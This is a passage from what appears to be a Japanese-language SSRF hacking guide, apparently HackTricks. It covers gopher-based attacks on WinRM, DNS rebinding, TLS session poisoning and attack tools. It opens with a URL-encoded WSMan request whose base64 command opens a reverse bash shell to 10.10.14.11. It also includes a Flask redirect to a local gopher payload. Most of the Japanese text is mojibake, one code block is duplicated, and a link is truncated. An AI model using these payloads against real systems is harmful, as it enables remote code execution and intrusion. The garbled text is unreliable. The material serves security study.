6e%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%2f%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%3c%2f%61%3a%41%63%74%69%6f%6e%3e%0a%20%20%20%20%20%20%3c%77%3a%4d%61%78%45%6e%76%65%6c%6f%70%65%53%69%7a%65%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%31%30%32%34%30%30%3c%2f%77%3a%4d%61%78%45%6e%76%65%6c%6f%70%65%53%69%7a%65%3e%0a%20%20%20%20%20%20%3c%61%3a%4d%65%73%73%61%67%65%49%44%3e%75%75%69%64%3a%30%41%42%35%38%30%38%37%2d%43%32%43%33%2d%30%30%30%35%2d%30%30%30%30%2d%30%30%30%30%30%30%30%31%30%30%30%30%3c%2f%61%3a%4d%65%73%73%61%67%65%49%44%3e%0a%20%20%20%20%20%20%3c%77%3a%4f%70%65%72%61%74%69%6f%6e%54%69%6d%65%6f%75%74%3e%50%54%31%4d%33%30%53%3c%2f%77%3a%4f%70%65%72%61%74%69%6f%6e%54%69%6d%65%6f%75%74%3e%0a%20%20%20%20%20%20%3c%77%3a%4c%6f%63%61%6c%65%20%78%6d%6c%3a%6c%61%6e%67%3d%22%65%6e%2d%75%73%22%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%66%61%6c%73%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%70%3a%44%61%74%61%4c%6f%63%61%6c%65%20%78%6d%6c%3a%6c%61%6e%67%3d%22%65%6e%2d%75%73%22%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%66%61%6c%73%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%77%3a%4f%70%74%69%6f%6e%53%65%74%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%77%3a%53%65%6c%65%63%74%6f%72%53%65%74%3e%0a%20%20%20%20%20%20%20%20%20%3c%77%3a%53%65%6c%65%63%74%6f%72%20%4e%61%6d%65%3d%22%5f%5f%63%69%6d%6e%61%6d%65%73%70%61%63%65%22%3e%72%6f%6f%74%2f%73%63%78%3c%2f%77%3a%53%65%6c%65%63%74%6f%72%3e%0a%20%20%20%20%20%20%3c%2f%77%3a%53%65%6c%65%63%74%6f%72%53%65%74%3e%0a%20%20%20%3c%2f%73%3a%48%65%61%64%65%72%3e%0a%20%20%20%3c%73%3a%42%6f%64%79%3e%0a%20%20%20%20%20%20%3c%70%3a%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%5f%49%4e%50%55%54%20%78%6d%6c%6e%73%3a%70%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%22%3e%0a%20%20%20%20%20%20%20%20%20%3c%70%3a%63%6f%6d%6d%61%6e%64%3e%65%63%68%6f%20%2d%6e%20%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%78%4d%43%34%78%4e%43%34%78%4d%53%38%35%4d%44%41%78%49%44%41%2b%4a%6a%45%3d%20%7c%20%62%61%73%65%36%34%20%2d%64%20%7c%20%62%61%73%68%3c%2f%70%3a%63%6f%6d%6d%61%6e%64%3e%0a%20%20%20%20%20%20%20%20%20%3c%70%3a%74%69%6d%65%6f%75%74%3e%30%3c%2f%70%3a%74%69%6d%65%6f%75%74%3e%0a%20%20%20%20%20%20%3c%2f%70%3a%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%5f%49%4e%50%55%54%3e%0a%20%20%20%3c%2f%73%3a%42%6f%64%79%3e%0a%3c%2f%73%3a%45%6e%76%65%6c%6f%70%65%3e%0a")
```python
self.end_headers()

httpd = HTTPServer(('0.0.0.0', 443), MainHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="server.pem", server_side=True)
httpd.serve_forever()
```
```python
self.end_headers()

httpd = HTTPServer(('0.0.0.0', 443), MainHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="server.pem", server_side=True)
httpd.serve_forever()
```

```python
from flask import Flask, redirect
from urllib.parse import quote
app = Flask(__name__)

@app.route('/')
def root():
return redirect('gopher://127.0.0.1:5985/_%50%4f%53%54%20%2f%77%73%6d%61%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20', code=301)

if __name__ == "__main__":
app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
```
![](<../../.gitbook/assets/image (9) (1) (2).png>)

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)ã‚’ä½¿ç”¨ã—ã¦ã€ä¸–ç•Œã§æœ€ã‚‚é«˜åº¦ãªã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ãƒ„ãƒ¼ãƒ«ã«ã‚ˆã£ã¦å¼·åŒ–ã•ã‚ŒãŸ**ãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼ã‚’ç°¡å˜ã«æ§‹ç¯‰**ã—ã€è‡ªå‹•åŒ–ã—ã¾ã™ã€‚\
ä»Šã™ãã‚¢ã‚¯ã‚»ã‚¹ã‚’å–å¾—ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## DNS Rebidding CORS/SOPãƒã‚¤ãƒ‘ã‚¹

**CORS/SOP**ã®åˆ¶é™ã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹ãŸã‚ã«ã€**ãƒ­ãƒ¼ã‚«ãƒ«IPã‹ã‚‰ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚’å¤–éƒ¨ã«æµå‡º**ã•ã›ã‚‹ã“ã¨ã«å•é¡ŒãŒã‚ã‚‹å ´åˆã€**DNS Rebidding**ã‚’ä½¿ç”¨ã§ãã¾ã™ã€‚

{% content-ref url="../cors-bypass.md" %}
[cors-bypass.md](../cors-bypass.md)
{% endcontent-ref %}

### è‡ªå‹•åŒ–ã•ã‚ŒãŸDNS Rebidding

[**`Singularity of Origin`**](https://github.com/nccgroup/singularity)ã¯ã€[DNS rebinding](https://en.wikipedia.org/wiki/DNS\_rebinding)æ”»æ’ƒã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã®ãƒ„ãƒ¼ãƒ«ã§ã™ã€‚ã“ã®ãƒ„ãƒ¼ãƒ«ã«ã¯ã€æ”»æ’ƒã‚µãƒ¼ãƒãƒ¼ã®DNSåã®IPã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ã‚¿ãƒ¼ã‚²ãƒƒãƒˆãƒã‚·ãƒ³ã®IPã‚¢ãƒ‰ãƒ¬ã‚¹ã«å†ãƒã‚¤ãƒ³ãƒ‰ã—ã€ã‚¿ãƒ¼ã‚²ãƒƒãƒˆãƒã‚·ãƒ³ä¸Šã®è„†å¼±ãªã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢ã‚’æ‚ªç”¨ã™ã‚‹ãŸã‚ã®æ”»æ’ƒãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’æä¾›ã™ã‚‹ãŸã‚ã«å¿…è¦ãªã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆãŒå«ã¾ã‚Œã¦ã„ã¾ã™ã€‚

ã¾ãŸã€[**http://rebind.it/singularity.html**](http://rebind.it/singularity.html)ã§å…¬é–‹ã•ã‚Œã¦ã„ã‚‹ã‚µãƒ¼ãƒãƒ¼ã‚‚ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ã€‚

## DNS Rebidding + TLSã‚»ãƒƒã‚·ãƒ§ãƒ³ID/ã‚»ãƒƒã‚·ãƒ§ãƒ³ãƒã‚±ãƒƒãƒˆ

è¦ä»¶ï¼š

* **SSRF**
* **ã‚¢ã‚¦ãƒˆãƒã‚¦ãƒ³ãƒ‰TLSã‚»ãƒƒã‚·ãƒ§ãƒ³**
* **ãƒ­ãƒ¼ã‚«ãƒ«ãƒãƒ¼ãƒˆä¸Šã®ã‚‚ã®**

æ”»æ’ƒæ‰‹é †ï¼š

1. ãƒ¦ãƒ¼ã‚¶ãƒ¼/ãƒœãƒƒãƒˆã«**æ”»æ’ƒè€…ãŒåˆ¶å¾¡ã™ã‚‹ãƒ‰ãƒ¡ã‚¤ãƒ³**ã«ã‚¢ã‚¯ã‚»ã‚¹ã•ã›ã¾ã™ã€‚
2. **DNS**ã®**TTL**ã¯**0**ç§’ã§ã™ï¼ˆã—ãŸãŒã£ã¦ã€è¢«å®³è€…ã¯ãƒ‰ãƒ¡ã‚¤ãƒ³ã®IPã‚’ã™ãã«å†åº¦ãƒã‚§ãƒƒã‚¯ã—ã¾ã™ï¼‰ã€‚
3. è¢«å®³è€…ã¨æ”»æ’ƒè€…ã®ãƒ‰ãƒ¡ã‚¤ãƒ³é–“ã§**TLSæ¥ç¶š**ãŒä½œæˆã•ã‚Œã¾ã™ã€‚æ”»æ’ƒè€…ã¯**ã‚»ãƒƒã‚·ãƒ§ãƒ³IDã¾ãŸã¯ã‚»ãƒƒã‚·ãƒ§ãƒ³ãƒã‚±ãƒƒãƒˆ**å†…ã«**ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰**ã‚’æŒ¿å…¥ã—ã¾ã™ã€‚
4. **ãƒ‰ãƒ¡ã‚¤ãƒ³**ã¯**è‡ªèº«ã«å¯¾ã—ã¦ç„¡é™ãƒ«ãƒ¼ãƒ—ã®ãƒªãƒ€ã‚¤ãƒ¬ã‚¯ãƒˆ**ã‚’é–‹å§‹ã—ã¾ã™ã€‚ã“ã‚Œã®ç›®çš„ã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼/ãƒœãƒƒãƒˆãŒãƒ‰ãƒ¡ã‚¤ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ç¶šã‘ã€ãƒ‰ãƒ¡ã‚¤ãƒ³ã®**DNSãƒªã‚¯ã‚¨ã‚¹ãƒˆ**ã‚’å†åº¦å®Ÿè¡Œã™ã‚‹ã“ã¨ã§ã™ã€‚
5. DNSãƒªã‚¯ã‚¨ã‚¹ãƒˆã§**ãƒ—ãƒ©ã‚¤ãƒ™ãƒ¼ãƒˆIPã‚¢ãƒ‰ãƒ¬ã‚¹**ãŒ**ç¾åœ¨**æŒ‡å®šã•ã‚Œã¾ã™ï¼ˆä¾‹ï¼š127.0.0.1ï¼‰ã€‚
6. ãƒ¦ãƒ¼ã‚¶ãƒ¼/ãƒœãƒƒãƒˆã¯**TLSæ¥ç¶šã‚’å†ç¢ºç«‹**ã—ã‚ˆã†ã¨ã—ã€ãã®ãŸã‚ã«**ã‚»ãƒƒã‚·ãƒ§ãƒ³ID/ãƒã‚±ãƒƒãƒˆID**ã‚’**é€ä¿¡**ã—ã¾ã™ï¼ˆæ”»æ’ƒè€…ã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ãŒå«ã¾ã‚Œã¦ã„ãŸå ´æ‰€ï¼‰ã€‚ãŠã‚ã§ã¨ã†ã”ã–ã„ã¾ã™ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼/ãƒœãƒƒãƒˆãŒ**è‡ªèº«ã‚’æ”»æ’ƒã™ã‚‹**ã‚ˆã†ã«è¦æ±‚ã™ã‚‹ã“ã¨ã«æˆåŠŸã—ã¾ã—ãŸã€‚

ã“ã®æ”»æ’ƒä¸­ã€localhost:11211ï¼ˆ_memcache_ï¼‰ã‚’æ”»æ’ƒã™ã‚‹å ´åˆã€è¢«å®³è€…ã«æœ€åˆã®æ¥ç¶šã‚’www.attacker.com:11211ï¼ˆ**ãƒãƒ¼ãƒˆã¯å¸¸ã«åŒã˜ã§ã‚ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™**ï¼‰ã§ç¢ºç«‹ã•ã›ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚\
ã“ã®æ”»æ’ƒã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«ã¯ã€æ¬¡ã®ãƒ„ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã§ãã¾ã™ï¼š[https://github.com/jmdx/TLS-poison/](https://github.com/jmdx/TLS-poison/)\
ã“ã®æ”»æ’ƒã«ã¤ã„ã¦ã®è©³ç´°ã¯ã€æ¬¡ã®ãƒˆãƒ¼ã‚¯ã‚’å‚ç…§ã—ã¦ãã ã•ã„ï¼š[https://www.youtube.com/watch?v=qGpAJxfADjo\&ab\_channel=DEFCONConference](https://www.youtube.com/watch?v=qGpAJxfADjo\&ab\_channel=DEFCONConference)

## Blind SSRF

ç›²ç›®ã®SSRFã¨éç›²ç›®ã®SSRFã®é•ã„ã¯ã€ç›²ç›®ã®å ´åˆã«SSRFãƒªã‚¯ã‚¨ã‚¹ãƒˆã®å¿œç­”ã‚’è¦‹ã‚‹ã“ã¨ãŒã§ããªã„ã“ã¨ã§ã™ã€‚ãã®ãŸã‚ã€æ—¢çŸ¥ã®è„†å¼±æ€§ã®ã¿ã‚’æ‚ªç”¨ã™ã‚‹ã“ã¨ãŒã§ãã‚‹ãŸã‚ã€æ‚ªç”¨ã¯ã‚ˆã‚Šå›°é›£ã§ã™ã€‚

### æ™‚é–“ãƒ™ãƒ¼ã‚¹ã®SSRF

ã‚µãƒ¼ãƒãƒ¼ã‹ã‚‰ã®å¿œç­”ã®æ™‚é–“ã‚’ãƒã‚§ãƒƒã‚¯ã™ã‚‹ã“ã¨ã§ã€ãƒªã‚½ãƒ¼ã‚¹ãŒå­˜åœ¨ã™ã‚‹ã‹ã©ã†ã‹ã‚’åˆ¤æ–­ã™ã‚‹ã“ã¨ãŒã§ãã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ï¼ˆå­˜åœ¨ã™ã‚‹ãƒªã‚½ãƒ¼ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã®ã«æ™‚é–“ãŒã‹ã‹ã‚‹å ´åˆã€å­˜åœ¨ã—ãªã„ãƒªã‚½ãƒ¼ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã‚ˆã‚Šã‚‚æ™‚é–“ãŒã‹ã‹ã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ï¼‰ã€‚

## Cloud SSRF Exploitation

ã‚¯ãƒ©ã‚¦ãƒ‰ç’°å¢ƒå†…ã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹ãƒã‚·ãƒ³ã§SSRFã®è„†å¼±æ€§ã‚’è¦‹ã¤ã‘ãŸå ´åˆã€ã‚¯ãƒ©ã‚¦ãƒ‰ç’°å¢ƒã«é–¢ã™ã‚‹èˆˆå‘³æ·±ã„æƒ…å ±ã‚„è³‡æ ¼æƒ…å ±ã‚’å…¥æ‰‹ã™ã‚‹ã“ã¨ãŒã§ãã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚

{% content-ref url="cloud-ssrf.md" %}
[cloud-ssrf.md](cloud-ssrf.md)
{% endcontent-ref %}

## SSRFã®è„†å¼±ãªãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ 

ã„ãã¤ã‹ã®æ—¢çŸ¥ã®ãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã«ã¯ã€SSRFã®è„†å¼±æ€§ãŒå«ã¾ã‚Œã¦ã„ã‚‹ã‹ã€å«ã¾ã‚Œã¦ã„ãŸã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚è©³ç´°ã¯æ¬¡ã‚’å‚ç…§ã—ã¦ãã ã•ã„ï¼š

{% content-ref url="ssrf-vulnerable-platforms.md" %}
[ssrf-vulnerable-platforms.md](ssrf-vulnerable-platforms.md)
{% endcontent-ref %}

## ãƒ„ãƒ¼ãƒ«

### [**SSRFMap**](https://github.com/swisskyrepo/SSRFmap)

SSRFã®è„†å¼±æ€§ã‚’æ¤œå‡ºãŠã‚ˆã³æ‚ªç”¨ã™ã‚‹ãŸã‚ã®ãƒ„ãƒ¼ãƒ«

### [Gopherus](https://github.com/tarunkant/Gopherus)

* [Gopherusã«é–¢ã™ã‚‹ãƒ–ãƒ­ã‚°è¨˜äº‹](https://spyclub.tech/2018/08/14/2018-08-14-blog-on-gopherus/)

ã“ã®ãƒ„ãƒ¼ãƒ«ã¯ã€æ¬¡ã®ãŸã‚ã®Gopherãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ç”Ÿæˆã—ã¾ã™ï¼š

* MySQL
* PostgreSQL
* FastCGI
* Redis
* Zabbix
* Memcache

### [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser)

* [SSRFã®ä½¿ç”¨ã«é–¢ã™ã‚‹ãƒ–ãƒ­ã‚°è¨˜äº‹](https://blog.tneitzel.eu/posts/01-attacking-java-rmi-via-ssrf/)

_remote-method-guesser_ã¯ã€ä¸€èˆ¬çš„ãªJava RMIã®è„†å¼±æ€§ã«å¯¾ã—ã¦æ”»æ’ƒæ“ä½œã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹Java RMIã®è„†å¼±æ€§ã‚¹ã‚­ãƒ£ãƒŠã§ã™ã€‚ã»ã¨ã‚“ã©ã®æ“ä½œã¯ã€è¦æ±‚ã•ã‚ŒãŸæ“ä½œã«å¯¾ã—ã¦SSRFãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ç”Ÿæˆã™ã‚‹ãŸã‚ã®`--ssrf`ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ã„ã¾ã™ã€‚`--gopher`ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã¨ä¸€ç·’ã«ä½¿ç”¨ã™ã‚‹ã¨ã€ç›´æ¥ä½¿ç”¨ã§ãã‚‹gopherãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ãŒç”Ÿæˆã•ã‚Œã¾ã™ã€‚

### [SSRF Proxy](https://github.com/bcoles/ssrf\_proxy)

SSRFã«å¯¾ã—ã¦è„†å¼±ãªã‚µãƒ¼ãƒãƒ¼ã‚’ä»‹ã—ã¦ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã®HTTPãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ã‚’ãƒˆãƒ³ãƒãƒ«ã™ã‚‹ãŸã‚ã«è¨­è¨ˆã•ã‚ŒãŸãƒãƒ«ãƒã‚¹ãƒ¬ãƒƒãƒ‰ã®HTTPãƒ—ãƒ­ã‚­ã‚·ã‚µãƒ¼ãƒãƒ¼ã€‚

### ç·´ç¿’ã™ã‚‹ãŸã‚ã«

{% embed url="https://github.com/incredibleindishell/SSRF_Vulnerable_Lab" %}

## å‚è€ƒæ–‡çŒ®

* [https://medium.com/@pravinponnusamy/ssrf-payloads-f09b2a86a8b4](https://medium.com/@pravinponnusamy/ssrf-payloads-f09b2a86a8b4)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
* [https://www.invicti.com/blog/web-security/ssrf-vulner
* [**å…¬å¼ã®PEASSï¼†HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã‚‹
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã«å‚åŠ ã™ã‚‹ã‹ã€[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter**ã§ç§ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹ [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* è‡ªåˆ†ã®ãƒãƒƒã‚­ãƒ³ã‚°ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ãŸã‚ã«ã€[**hacktricksãƒªãƒã‚¸ãƒˆãƒª**](https://github.com/carlospolop/hacktricks)ã¨[**hacktricks-cloudãƒªãƒã‚¸ãƒˆãƒª**](https://github.com/carlospolop/hacktricks-cloud)ã«PRã‚’æå‡ºã™ã‚‹ã€‚

</details>

![](<../../.gitbook/assets/image (9) (1) (2).png>)

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)ã‚’ä½¿ç”¨ã—ã¦ã€ä¸–ç•Œã§æœ€ã‚‚é«˜åº¦ãªã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ãƒ„ãƒ¼ãƒ«ã«ã‚ˆã£ã¦å¼·åŒ–ã•ã‚ŒãŸãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼ã‚’ç°¡å˜ã«æ§‹ç¯‰ã—ã¦è‡ªå‹•åŒ–ã—ã¾ã™ã€‚\
ä»Šã™ãã‚¢ã‚¯ã‚»ã‚¹ã‚’å–å¾—ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
